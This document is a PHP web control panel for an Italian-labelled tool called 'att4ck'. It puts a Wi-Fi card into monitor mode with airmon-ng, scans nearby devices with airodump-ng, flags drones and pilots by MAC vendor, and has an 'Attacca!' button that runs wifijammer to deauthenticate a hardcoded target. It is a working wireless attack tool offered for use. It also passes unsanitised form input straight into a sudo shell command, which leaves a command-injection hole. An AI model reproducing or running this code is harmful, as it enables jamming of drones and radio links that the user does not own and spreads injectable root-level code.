<?php 
session_start();

if(isset($_SESSION["wlan"]))
{
	$wwlan = $_SESSION["wlan"];
}
else
{
	$wwlan = "Nessuna";
}

?>
<html>
<head>
  <title>att4ck</title>
</head>
<body>
	<center><img src="images/droneini.jpeg" alt="att4ck 1.0" width="250" height="250"> </center>

<form method="post">
  <table
 style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
  <tbody>
  <tr>
	<td style="text-align: center;"><button name="mode">Avvia il Monitor Mode [<?php echo $wwlan?>]</button></td>
	<td style="text-align: center;"><button name="reset">Reset Moduli</button></td>
  </tr>
	<tr>
    <td style="text-align: center;"><button name="start">Avvia Ricerca Drone</button></td>
    <td style="text-align: center;"><button name="reboot">Riavvia Att4ck</button></td>
	</tr>
	<tr>
    <td style="text-align: center;"><button name="deuth">Attaca Drone/Pilota</button></td>
        <td style="text-align: center;"><button name="setdrone">Imposta (mac) come Drone</button></td>

  </tr>
 </tbody>
  </table>
</form>
</body>
</html>

<?php 

if (isset($_POST['reset']))
{
  session_destroy();
header('Refresh: 3; url=index.php');

}
else if (isset($_POST['reboot']))
{
  session_destroy();
  exec("sudo reboot", $output, $code);

}
else if (isset($_POST['setdrone']))
{
	if(!isset($_SESSION["mac3"]))
{
?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode e cerca un Drone/Pilota e seleziona il MAC!</td></center>
<?php
}
else
{
include("connect.php");
set_drone($_SESSION["mac3"],$conn);
}
}
else if (isset($_POST['mode']))
{
	exec("cd /usr/lib/cgi-bin && sudo airmon-ng | grep -Eo 'wlan[1-9]'", $output, $code);
	switch($code) {
    case 0:
    
    
    if($output>0) :
    
    ?>

<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
	<form method="post">

	    <tr>
        <th>Nome scheda</th>
    </tr>
    
    <?php foreach ($output as $row): ?>
    

<tr>
		<td style="text-align: center;"><button name="wlan"><?php echo $row;?></button></td>
          <input type="hidden" name="testo" value="<?php echo $row;?>" />
    </tr>
    <?php endforeach;endif; ?>
</table>
    
    <?php 
    
     break;
   }
}
else if(isset($_POST['testo']))
{
	?>
	<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
 	 <tbody>
		 	<tr>
 	<td style="text-align: center;">Hai selezionato l'interfaccia <?php echo $_POST['testo']; ?> ...</td>
		 	</tr>
 <?php
	exec("cd /usr/lib/cgi-bin && sudo airmon-ng start ".$_POST['testo']." | grep -Eo 'wlan[0-9]mon'", $output, $code);
	switch($code) {
    case 0: 
?>
<tr>
	 <td style="text-align: center;">L'interfaccia Monitor [<?php echo $output[0];?>] è stata abilitata...</td>
	        </tr>  
	        <tr>
	 <td style="text-align: center;">Avvia la ricerca dei Droni nelle vicinanze!</td>
	        </tr>  
	         </tbody>
     </table>
 
<?php
$_SESSION['wlan'] = $output[0];
header('Refresh: 3; url=index.php');


	    break;
    }
}
else if(isset($_POST['start']))
{
	
if(!isset($_SESSION["wlan"]))
{
?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode!!!</td></center>
<?php
}
else
{
	include("connect.php");
	
	exec("sudo timeout --foreground 5 airodump-ng -w /var/www/html/my --output-format csv --write-interval 1 ".$_SESSION["wlan"]. "",  $output, $code);
     
    if($output>0) {
     exec("sudo /var/www/html/converti",$output,$code);

$mac = array();
$myfile = fopen("/var/www/html/out.csv", "r") or die("Non riesco a vedere nessun drone!");
// Output one character until end-of-file
while(!feof($myfile)) {

		   $mac[] = fgets($myfile); 

}
fclose($myfile);  
}


for ($i = 0, $n = count($mac) ; $i < $n ; $i++)	
	{	 
				
		
    $findme = 'BSSID';
    $findme2 = 'Station MAC';

    $pos = strpos($mac[$i], $findme);
    $pos2 = strpos($mac[$i], $findme2);

   
  if($pos !== false)  
    {
      unset($mac[$i]);	
      array_splice( $mac , $i, 0, '<img src="images/dronecerca.png" title="Droni" width="50"><br><span style="color:#800000;text-align:center;">Possibili Droni</span>');

	} 
  else if($pos2 !== false)  
 { 
      unset($mac[$i]);	
      array_splice( $mac , $i, 0, '<img src="images/telecomando.png" title="Piloti" width="50"><br><span style="color:#800000;text-align:center;">Possibili Piloti</span>');

}

   ?>

<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
	<form method="post">
    
<?php 	
	$mac_split = str_split($mac[$i],8); 
	$return = $mac_split[0];
		
	 $res = check_vendor($return,$conn);
     $drone = check_drone($return,$conn);
     
     if($res[0]!=='') 
     {
	   ?> 
 	 <tr> <td style="text-align: center;"><?php echo $mac[$i]; ?></td> 
 	 <?php
	 	if($res["vendor"] !== null) 
 	 {
	 	 if($drone[0] == 1){
		 	?> 
		 	 	
		 	 		<tr> <td style="text-align: center;"><?php echo '<span style="color:#ff0000;text-align:center;">'.$res["vendor"].'</span>'; ?></td></tr>
		 	 		<tr> <td style="text-align: center;"><?php echo '<span style="color:#ff0000;text-align:center;"> DRONE TROVATO!</span>'; ?></td></tr>
		 	 	  <tr> <td style="text-align: center;"><button name="selmac">Attacca!</button></td></tr>
               <input type="hidden" name="selmac" value="<?php echo $mac[$i];?>" />

    </tr>
</table>
    </form>

		 	 <?php
		 	 }
		 	 else
		 	 {
 	 ?>
	<tr> <td style="text-align: center;"><?php echo '<span style="color:#0066ff;text-align:center;">'.$res["vendor"].'</span>'; ?></td></tr>
    <tr> <td style="text-align: center;"><button name="selmac">Seleziona</button></td></tr>
               <input type="hidden" name="selmac" value="<?php echo $mac[$i];?>" />

    </tr>
</table>
    </form>
<?php
}
}
else
{
	?>
	<tr> <td style="text-align: center;"><?php echo '<span style="color:#cc00cc;text-align:center;">Non rilevo il vendor!</span>'; ?></td></tr>
    </tr>
</table>
    </form>
<?php	
	
}

}


} 
	
  


}
}    
else if(isset($_POST['selmac']))
{
	$_SESSION["mac"] = $_POST['selmac'];
    
    $mac_split = str_split($_POST['selmac'],8); 
	$mac3 = $mac_split[0];
    
    $_SESSION["mac3"] = $mac3;	


	?>
	<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2">
	 
 	 <tbody>
		 	<tr>
 	         <td style="text-align: center;">Hai selezionato: <?php echo $_SESSION["mac"] ?>, comincia l'attacco!!</td>
		 	</tr>
	         </tbody>
     </table>
<?php
}
else if(isset($_POST['deuth']))
{
if(!isset($_SESSION["mac"]))
{
?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode e cerca un Drone/Pilota da attaccare!</td></center>
<?php
}
else
{


exec("sudo /var/www/html/wifijammer/wifijammer -a 8C:F5:A3:D5:1F:18", $output, $code);



	}
}

?>
